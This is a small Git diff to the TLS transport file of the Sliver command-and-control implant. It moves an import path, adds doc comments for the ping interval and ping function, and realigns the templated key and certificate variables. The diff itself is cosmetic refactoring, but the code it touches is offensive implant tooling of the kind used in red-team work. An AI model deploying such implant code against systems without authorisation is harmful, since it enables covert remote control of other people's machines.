@@ -34,16 +34,18 @@ import (
 
 	"os"
 
-	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
 var (
+	// PingInterval - Amount of time between in-band "pings"
 	PingInterval = 2 * time.Minute
-	readBufSize  = 16 * 1024 // 16kb
-	keyPEM       = `{{.Config.Key}}`
-	certPEM      = `{{.Config.Cert}}`
+
+	readBufSize = 16 * 1024 // 16kb
+	keyPEM      = `{{.Config.Key}}`
+	certPEM     = `{{.Config.Cert}}`
 )
 
 // WriteEnvelope - Writes a message to the TLS socket using length prefix framing
@@ -64,6 +66,7 @@ func WriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
 	return nil
 }
 
+// WritePing - Send a "ping" message to the server
 func WritePing(connection *tls.Conn) error {
 	// {{if .Config.Debug}}
 	log.Print("Socket ping")
